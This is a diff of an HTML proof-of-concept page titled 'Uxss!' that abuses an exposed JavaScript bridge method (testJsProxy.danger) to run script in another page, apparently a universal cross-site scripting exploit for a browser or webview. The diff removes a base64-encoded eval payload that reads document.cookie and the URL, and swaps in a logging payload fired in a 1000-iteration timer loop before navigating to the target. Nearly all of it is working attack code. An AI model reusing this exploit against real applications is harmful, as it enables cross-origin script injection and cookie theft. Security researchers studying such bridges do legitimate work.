@@ -1,19 +1,10 @@
 <h1>Uxss!</h1>
 <script>
   function triggerPoc(url,code){
-    const currUrl = location.href;
-    const payload = `
-    let url = location.href;
-    console.log('CloudX steal cookie-up:'+document.cookie.length);
-    console.log("payload-url:"+url);
-    document.write(123);
-    `
-    const base64 = btoa(payload);
     for(let i=0; i<1000; i++){
       setTimeout(function(){
       if(window.testJsProxy && typeof window.testJsProxy.danger === "function"){
-        window.testJsProxy.danger(`eval(atob("${base64}"))`);
-
+        window.testJsProxy.danger(`console.log("cloudx-> " + location.href);window.testJsProxy.danger("console.log(1)")`);
       }},i)
     }
     location.href = url;
